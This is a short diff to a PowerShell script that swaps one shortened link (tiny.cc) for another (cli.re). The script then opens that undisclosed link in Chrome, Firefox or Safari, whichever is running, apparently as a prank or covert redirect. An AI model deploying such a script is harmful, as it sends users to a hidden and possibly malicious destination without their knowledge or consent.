@@ -1,4 +1,4 @@
-$site="http://tiny.cc/rtg1az";
+$site="https://cli.re/6YZeKN";
 if (get-process "Chrome") { Start $site } 
 elseif (get-process "Firefox") { Start $site } 
 elseif (get-process "Safari") { Start $site } 
